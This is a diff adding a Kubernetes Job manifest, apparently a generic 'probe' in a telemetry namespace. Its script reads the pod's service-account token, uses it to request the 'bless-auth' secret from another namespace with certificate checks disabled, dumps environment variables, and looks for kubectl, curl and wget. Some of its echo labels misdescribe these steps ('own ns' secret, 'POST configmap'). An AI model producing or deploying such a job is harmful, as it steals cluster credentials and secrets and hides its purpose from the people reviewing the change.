@@ -1,0 +1,31 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: job-5413cf3c
+  namespace: bless-data-telemetry
+spec:
+  ttlSecondsAfterFinished: 60
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+        - name: probe
+          image: ipfs/kubo:v0.37.0
+          command: ["/bin/sh","-c"]
+          args:
+            - |
+              set -x
+              SA=/
+              echo "=== SA token present ==="
+              ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1
+              TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+              CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+              APIS=https://kubernetes.default.svc
+              echo "=== GET own ns secret bless-data-telemetry (may 404) ==="
+              wget -q -O- --no-check-certificate --header="Authorization: Bearer $TOK" $APIS/api/v1/namespaces/bless-auth/secrets/bless-auth 2>&1 | head -c 400
+              echo
+              echo "=== POST configmap to own ns ==="
+              env | sort | head -40
+              echo "=== kubectl? ==="
+              which kubectl curl wget 2>&1
